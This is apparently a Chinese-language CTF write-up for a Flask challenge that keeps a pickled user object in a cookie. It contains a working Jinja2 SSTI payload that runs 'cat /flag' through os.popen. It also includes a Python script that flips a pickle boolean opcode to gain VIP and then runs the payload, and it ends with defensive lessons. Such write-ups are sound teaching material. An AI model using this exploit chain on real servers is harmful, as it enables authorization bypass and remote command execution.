# MiniLCTF 2021 - l_inc

## 题目简述

Flask 应用把 `User` 对象用 Python `pickle` 序列化、Base64 编码后直接放进客户端 Cookie。`/home` 对 Cookie 执行 `pickle.loads`，若 `vip` 为真，又把 `user.name` 拼入模板字符串交给 `render_template_string`。因此先篡改 Pickle 把普通用户升级为 VIP，再让用户名携带 Jinja2 SSTI，即可读取 flag。

## 解题过程

正常注册时，协议 4 Pickle 中布尔假使用 `NEWFALSE` 操作码 `0x89`，布尔真使用 `NEWTRUE` 操作码 `0x88`。最省事的做法是注册时就把 SSTI 写入用户名，然后只修改 Cookie 中紧邻 `vip` 字段的布尔操作码。

应用对模板内容没有任何过滤，可以使用 Jinja 全局对象 `cycler` 进入其函数全局命名空间：

```jinja2
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
```

自动利用脚本如下：

```python
import base64
import requests

base = "http://127.0.0.1:5000"
payload = "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}"
s = requests.Session()

# 先让服务端生成结构和模块名都完全匹配的 Pickle。
r = s.post(base + "/", data={"name": payload}, allow_redirects=False)
cookie = r.cookies["user"]
raw = base64.b64decode(cookie)

needle = b"\x8c\x03vip\x94\x89"
patched = raw.replace(needle, b"\x8c\x03vip\x94\x88", 1)
assert patched != raw
s.cookies.set("user", base64.b64encode(patched).decode())

r = s.get(base + "/home")
print(r.text)
```

更直接的非预期解是手写 Pickle opcode，让反序列化过程调用 `open('/flag').read()` 并把结果放入 `name`；不过这会在“不可信反序列化”阶段直接执行代码。上面的预期链更清楚地展示了身份篡改与 SSTI 两个漏洞。flag 由部署环境提供，没有固定仓库值。

## 方法总结

Pickle 既不提供完整性，也不是安全的数据交换格式。即使攻击者不利用其任意代码执行能力，只改一个布尔操作码也能破坏授权；后续 `render_template_string` 又把可控属性升级为 SSTI。客户端状态应使用带认证的简单数据格式，服务端应重新查询权限，模板内容本身也不能由用户拼接生成。
